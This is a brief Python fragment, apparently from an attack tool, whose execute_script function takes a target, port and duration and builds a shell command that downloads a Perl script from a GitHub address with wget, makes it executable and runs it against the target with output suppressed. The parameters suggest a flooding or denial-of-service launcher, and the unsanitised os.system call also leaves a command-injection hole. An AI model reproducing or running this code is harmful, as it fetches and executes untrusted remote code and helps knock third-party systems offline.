...
def execute_script(target, port, duration):
    ...
    command = f"cd .. && cd hvr && cd usr && wget https://github.com/proxy807010/gaandmaarlungateri/raw/main/SamZGamerz.pl > /dev/null 2>&1 && chmod +x * && perl SamZGamerz.pl {target} {port} {duration} 100 rohan123 rohan123 > /dev/null 2>&1"
    os.system(command)
